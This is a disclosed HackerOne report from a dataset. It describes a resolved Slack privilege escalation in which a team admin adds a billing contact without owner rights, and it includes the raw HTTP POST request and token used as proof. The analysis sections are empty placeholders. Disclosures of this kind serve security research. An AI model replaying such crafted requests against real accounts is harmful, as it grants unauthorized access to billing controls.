---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '47940'
original_report_id: '47940'
title: Team admin can add billing contacts
weakness: Privilege Escalation
team_handle: slack
created_at: '2015-02-17T08:46:56.981Z'
disclosed_at: '2015-04-03T00:45:03.393Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- privilege-escalation
---

# Team admin can add billing contacts

## Metadata

- HackerOne Report ID: 47940
- Weakness: Privilege Escalation
- Program: slack
- Disclosed At: 2015-04-03T00:45:03.393Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Billing contacts can only be added by team owners. However, team admin can escalate his privileges and add billing contacts.

Steps to reproduce:
1.Log in as team admin
2.Send the below request using his token and it adds 'hacker@hacker.com' to billing contacts.

POST /api/team.billing.addContact HTTP/1.1
Host: satishb3mailinator.slack.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 106

email=hacker@hacker.com&token=xoxs-3206092076-3204538285-3743137121-836b042620&set_active=true&_attempts=1

To confirm, login as team owner and navigate to billing contacts. Notice that hacker@hacker.com is added to billing contact list.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
